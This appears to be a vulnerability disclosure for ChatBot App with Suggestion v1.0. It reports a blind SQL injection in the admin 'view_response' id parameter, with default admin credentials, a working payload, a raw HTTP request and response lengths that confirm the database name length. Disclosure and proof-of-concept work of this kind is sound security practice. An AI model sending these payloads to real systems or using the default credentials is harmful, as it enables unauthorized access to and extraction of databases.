# ChatBot App with Suggestion v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15316/chatbot-app-suggestion-phpoop-free-source-code.html

Vulnerability File: /simple_chat_bot/admin/?page=responses/view_response&id=

Vulnerability location: /simple_chat_bot/admin/?page=responses/view_response&id=, id

[+] Payload: /simple_chat_bot/admin/?page=responses/view_response&id=8%27%20and%20length(database())%20=11--+ // Leak place ---> id

Current database name: chat_bot_db,length is 11

```sql
GET /simple_chat_bot/admin/?page=responses/view_response&id=8%27%20and%20length(database())%20=11--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 10, Content-Length: 24001
![image](https://user-images.githubusercontent.com/54017627/170820197-7eb4519b-d9bc-45ac-935f-f54d13eec85d.png)

![image](https://user-images.githubusercontent.com/54017627/170820211-7615e13b-35e4-4321-90e4-2fa7d3bf748d.png)

When length (database ()) = 11, Content-Length: 24317
![image](https://user-images.githubusercontent.com/54017627/170820187-b7e57f31-27c1-474d-8134-2f7bfc2381a5.png)

![image](https://user-images.githubusercontent.com/54017627/170820205-b73c1260-e8e3-4a75-bda8-ea60494084ab.png)
